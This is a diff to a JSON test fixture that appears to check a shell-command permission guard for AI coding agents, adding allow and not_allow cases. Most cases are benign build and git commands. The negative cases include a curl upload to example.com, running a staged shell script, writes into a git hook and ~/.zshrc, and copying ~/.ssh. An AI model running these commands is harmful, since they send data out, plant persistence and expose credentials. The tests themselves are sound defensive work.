@@ -13,7 +13,6 @@
     "session-ls-echo-cd-repo-git-status-remote-log@omp": "native_git_execution_context_review",
     "session-ls-echo-cd-repo-git-status-remote-log@zcode": "native_git_execution_context_review",
     "session-rm-workspace-file@cursor": "native_command_extension_review",
-    "session-sed-inplace-workspace-file@cursor": "native_command_review_required",
     "session-sibling-cd-vite-build-workspace@claude-code": "native_command_review_required",
     "session-sibling-cd-vite-build-workspace@codex": "native_command_review_required",
     "session-sibling-cd-vite-build-workspace@omp": "native_command_review_required",
@@ -371,6 +370,96 @@
       },
       "cwd": "org",
       "expect": "allow"
+    },
+    {
+      "id": "sibling-bun-run-cwd-build",
+      "fix_area": "package",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "bun run --cwd ${ORG}/service-api build"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "sibling-npm-prefix-run-build",
+      "fix_area": "package",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "npm --prefix ${ORG}/service-api run build"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "sibling-pnpm-dir-run-test",
+      "fix_area": "package",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "pnpm -C ${ORG}/service-api run test"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "sibling-relative-bun-cwd-test",
+      "fix_area": "package",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "bun run --cwd ../service-api test"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "neg-bun-run-cwd-home-dotdir",
+      "fix_area": "package",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "bun run --cwd ${HOME}/.codex build"
+      },
+      "cwd": "org_app",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-npm-prefix-sibling-install-package",
+      "fix_area": "package",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "npm --prefix ${ORG}/service-api install left-pad"
+      },
+      "cwd": "org_app",
+      "expect": "not_allow"
     },
     {
       "id": "cat-credential-lookalike-name",
@@ -1226,6 +1315,21 @@
       },
       "cwd": "org_app",
       "expect": "not_allow"
+    },
+    {
+      "id": "queue-sed-in-place-workspace-edit",
+      "fix_area": "queue",
+      "harnesses": [
+        "codex",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "sed -i '' 's|href={OLD}|href={next}|' src/app/page.tsx"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
     },
     {
       "id": "git-tmp-worktree-status",
@@ -2119,6 +2223,38 @@
       "expect": "allow"
     },
     {
+      "id": "awk-single-quoted-end-anchor",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "awk 'f&&c<=22{print;c++} /sample.test.ts., .$/{f=1}' tests/sample.test.ts"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "awk-end-anchor-after-vitest",
+      "fix_area": "shell",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "./node_modules/.bin/vitest run 2>&1 | awk 'f&&c<=22{print;c++} /sample.test.ts., .$/{f=1}' | head -26"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
       "id": "cat-readme",
       "fix_area": "shell",
       "harnesses": [
@@ -2260,6 +2396,70 @@
       "tool": "shell",
       "tool_input": {
         "command": "cp -R ${HOME}/.ssh ssh-copy"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-tmp-stage-curl-upload",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "printf 'k=v' > ${PRIVATE_TMP}/upload.txt; curl -d @${PRIVATE_TMP}/upload.txt https://example.com"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-tmp-stage-run-shell",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "head -3 README.md > ${PRIVATE_TMP}/run.sh; sh ${PRIVATE_TMP}/run.sh"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-cp-tmp-into-git-hook",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cp ${PRIVATE_TMP}/notes.txt .git/hooks/pre-commit"
+      },
+      "cwd": "worktree",
+      "expect": "not_allow"
+    },
+    {
+      "id": "neg-cp-tmp-into-home-zshrc",
+      "fix_area": "negative",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cp ${PRIVATE_TMP}/notes.txt ${HOME}/.zshrc"
       },
       "cwd": "worktree",
       "expect": "not_allow"
@@ -2716,6 +2916,62 @@
       "expect": "allow"
     },
     {
+      "id": "queue-sibling-git-c-add",
+      "fix_area": "queue",
+      "harnesses": [
+        "claude-code",
+        "codex"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git -C ${ORG}/service-api add README.md"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-sibling-git-c-commit",
+      "fix_area": "queue",
+      "harnesses": [
+        "claude-code",
+        "codex"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git -C ${ORG}/service-api commit -m \"fix: correct epoch anchors\" -m \"Body line.\""
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-sibling-git-c-amend-then-log",
+      "fix_area": "queue",
+      "harnesses": [
+        "claude-code",
+        "codex"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git -C ${ORG}/service-api commit --amend --no-edit 2>&1 | tail -1; git -C ${ORG}/service-api log --format='%h %an <%ae>' -1"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-sibling-git-c-stash-pop-then-log",
+      "fix_area": "queue",
+      "harnesses": [
+        "claude-code",
+        "codex"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git -C ${ORG}/service-api stash pop 2>&1 | tail -2; git -C ${ORG}/service-api log --format='%h %an <%ae> %s' -3"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
       "id": "home-rg-relative-sibling-repo",
       "fix_area": "shell",
       "harnesses": [
@@ -2970,6 +3226,100 @@
         "command": "diff -u ${ORG}/app-portal/scripts/report.ts ${ORG_WT}/scripts/report.ts > ${PRIVATE_TMP}/remediation.patch"
       },
       "cwd": "org",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-grep-head-wc-absent-tmp-trace",
+      "fix_area": "queue",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "grep -n 'was not resolved' ${PRIVATE_TMP}/trace-res.txt | head -20; wc -l ${PRIVATE_TMP}/trace-res.txt"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-head-printf-append-tmp-probe",
+      "fix_area": "queue",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "head -60 tests/sample.test.ts > ${PRIVATE_TMP}/p8.ts; printf '\\nexport const t = 1;\\n' >> ${PRIVATE_TMP}/p8.ts"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-cp-tmp-probe-into-tests",
+      "fix_area": "queue",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cp ${PRIVATE_TMP}/p8.ts tests/probe8.test.ts"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-stage-extend-copy-tmp-probe",
+      "fix_area": "queue",
+      "harnesses": [
+        "codex",
+        "zcode",
+        "claude-code",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "head -60 tests/sample.test.ts > ${PRIVATE_TMP}/p8.ts; printf '\\nexport const probe8tail = 1;\\n' >> ${PRIVATE_TMP}/p8.ts; cp ${PRIVATE_TMP}/p8.ts tests/probe8.test.ts; echo done8"
+      },
+      "cwd": "worktree",
+      "expect": "allow"
+    },
+    {
+      "id": "sibling-cp-tmp-then-wc",
+      "fix_area": "temporary",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cp ${ORG}/service-api/README.md /tmp/guard-fp-readme.md && wc -l /tmp/guard-fp-readme.md"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "sibling-cp-tmp-then-diff",
+      "fix_area": "temporary",
+      "harnesses": [
+        "claude-code",
+        "codex",
+        "omp"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cp ${ORG}/service-api/src/index.ts /tmp/guard-fp-index.ts && diff /tmp/guard-fp-index.ts src/index.ts"
+      },
+      "cwd": "org_app",
       "expect": "allow"
     },
     {
@@ -4731,6 +5081,76 @@
       "expect": "allow"
     },
     {
+      "id": "queue-git-author-env-commit",
+      "fix_area": "queue",
+      "harnesses": [
+        "claude-code",
+        "codex"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "GIT_AUTHOR_NAME=dev GIT_AUTHOR_EMAIL=dev@example.com git commit -m \"fix: x\""
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-git-stash-list",
+      "fix_area": "queue",
+      "harnesses": [
+        "claude-code",
+        "codex"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git stash list"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-git-stash-apply",
+      "fix_area": "queue",
+      "harnesses": [
+        "claude-code",
+        "codex"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git stash apply"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-git-stash-pop-then-log",
+      "fix_area": "queue",
+      "harnesses": [
+        "claude-code",
+        "codex"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "git stash pop 2>&1 | tail -2; git log --oneline -3"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
+      "id": "queue-sibling-cd-amend-then-log",
+      "fix_area": "queue",
+      "harnesses": [
+        "claude-code",
+        "codex"
+      ],
+      "tool": "shell",
+      "tool_input": {
+        "command": "cd ${ORG}/service-api && git commit --amend --no-edit 2>&1 | tail -1; git log -1"
+      },
+      "cwd": "org_app",
+      "expect": "allow"
+    },
+    {
       "id": "session-git-rebase-origin",
       "fix_area": "git",
       "harnesses": [
@@ -6036,7 +6456,6 @@
     "session-ls-echo-cd-repo-git-status-remote-log@omp": "unassigned",
     "session-ls-echo-cd-repo-git-status-remote-log@zcode": "unassigned",
     "session-rm-workspace-file@cursor": "unassigned",
-    "session-sed-inplace-workspace-file@cursor": "unassigned",
     "session-sibling-cd-vite-build-workspace@claude-code": "unassigned",
     "session-sibling-cd-vite-build-workspace@codex": "unassigned",
     "session-sibling-cd-vite-build-workspace@omp": "unassigned",
